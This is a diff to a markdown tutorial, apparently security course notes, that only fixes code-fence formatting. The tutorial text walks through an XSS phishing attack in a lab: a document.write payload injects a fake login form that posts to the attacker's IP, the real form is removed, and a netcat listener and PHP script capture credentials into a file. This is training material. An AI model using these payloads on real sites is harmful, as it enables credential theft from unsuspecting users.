@@ -34,8 +34,7 @@ Once we identify a working XSS payload, we can proceed to the phishing attack. T
 
 We can easily find HTML code for a basic login form, or we can write our own login form. The following example should present a login form:
 
-```
-        html
+```html
 <h3>Please login to continue</h3>
 <form action=http://OUR_IP>
     <input type="username" name="username" placeholder="Username">
@@ -46,8 +45,7 @@ We can easily find HTML code for a basic login form, or we can write our own log
 
 In the above HTML code, `OUR_IP` is the IP of our VM, which we can find with the (`ip a`) command under `tun0`. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:
 
-```
-        html
+```html
 <div>
 <h3>Please login to continue</h3>
 <input type="text" placeholder="Username">
@@ -59,8 +57,7 @@ In the above HTML code, `OUR_IP` is the IP of our VM, which we can find with the
 
 Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function `document.write()`, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the `write` function, the final JavaScript code should be as follows:
 
-```
-        javascript
+```javascript
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 ```
 
@@ -81,8 +78,7 @@ To find the `id` of the HTML element we want to remove, we can open the `Page In
 
 As we see in both the source code and the hover text, the `url` form has the id `urlform`:
 
-```
-        html
+```html
 <form role="form" action="index.php" method="GET" id='urlform'>
     <input type="text" placeholder="Image URL" name="url">
 </form>
@@ -90,15 +86,13 @@ As we see in both the source code and the hover text, the `url` form has the id 
 
 So, we can now use this id with the `remove()` function to remove the URL form:
 
-```
-        javascript
+```javascript
 document.getElementById('urlform').remove();
 ```
 
 Now, once we add this code to our previous JavaScript code (after the `document.write` function), we can use this new JavaScript code in our payload:
 
-```
-        javascript
+```javascript
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
 ```
 
@@ -110,8 +104,7 @@ http://SERVER\_IP/phishing/index.php?url=...SNIP...
 
 We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
 
-```
-        html
+```html
 ...PAYLOAD... <!--
 ```
 
@@ -131,16 +124,14 @@ Finally, we come to the part where we steal the login credentials when the victi
 
 So, let us start a simple `netcat` server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 80
 listening on [any] 80 ...
 ```
 
 Now, let's attempt to login with the credentials `test:test`, and check the `netcat` output we get (`don't forget to replace OUR_IP in the XSS payload with your actual IP`):
 
-```
-        shellsession
+```shellsession
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
 GET /?username=test&password=test&submit=Login HTTP/1.1
 Host: 10.10.XX.XX
@@ -153,8 +144,7 @@ However, as we are only listening with a `netcat` listener, it will not handle t
 
 The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):
 
-```
-        php
+```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
@@ -168,8 +158,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 
 Now that we have our `index.php` file ready, we can start a `PHP` listening server, which we can use instead of the basic `netcat` listener we used earlier:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mkdir /tmp/tmpserver
 hiimeins@htb[/htb]$ cd /tmp/tmpserver
 hiimeins@htb[/htb]$ vi index.php #at this step we wrote our index.php file
@@ -185,8 +174,7 @@ http://SERVER\_IP/phishing/index.php
 
 If we check the `creds.txt` file in our Pwnbox, we see that we did get the login credentials:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat creds.txt
 Username: test | Password: test
 ```
